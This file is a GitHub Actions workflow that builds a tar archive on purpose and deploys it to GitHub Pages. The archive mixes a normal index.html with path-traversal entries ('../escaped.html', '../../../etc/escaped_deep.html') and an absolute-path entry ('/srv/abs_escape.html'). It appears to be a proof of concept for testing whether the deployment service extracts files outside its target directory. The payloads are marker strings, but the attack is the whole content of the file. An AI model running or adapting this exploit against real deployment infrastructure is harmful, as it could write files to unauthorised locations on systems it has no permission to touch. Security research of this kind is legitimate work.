name: Deploy Pages
on:
  push:
    branches: [main]
  workflow_dispatch:
permissions:
  contents: read
  pages: write
  id-token: write
concurrency:
  group: pages
  cancel-in-progress: true
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Build malicious tar
        run: |
          python3 - <<'PYEOF'
          import tarfile, io, os
          tf = tarfile.open('/tmp/artifact.tar', 'w')
          # Normal entry
          ti = tarfile.TarInfo('index.html')
          content = b'<h1>Pages Index</h1>\n'
          ti.size = len(content)
          tf.addfile(ti, io.BytesIO(content))
          # Path traversal entry: ../escaped.html
          ti2 = tarfile.TarInfo('../escaped.html')
          c2 = b'ESCAPED_DOTDOT\n'
          ti2.size = len(c2)
          tf.addfile(ti2, io.BytesIO(c2))
          # Deep traversal
          ti3 = tarfile.TarInfo('../../../etc/escaped_deep.html')
          c3 = b'ESCAPED_DEEP\n'
          ti3.size = len(c3)
          tf.addfile(ti3, io.BytesIO(c3))
          # Absolute path entry
          ti4 = tarfile.TarInfo('/srv/abs_escape.html')
          c4 = b'ESCAPED_ABS\n'
          ti4.size = len(c4)
          tf.addfile(ti4, io.BytesIO(c4))
          tf.close()
          PYEOF
          ls -la /tmp/artifact.tar
          tar tvf /tmp/artifact.tar
      - name: Upload manually
        uses: actions/upload-artifact@v4
        with:
          name: github-pages
          path: /tmp/artifact.tar
          retention-days: 1
  deploy:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - id: deployment
        uses: actions/deploy-pages@v4
        with:
          artifact_name: github-pages
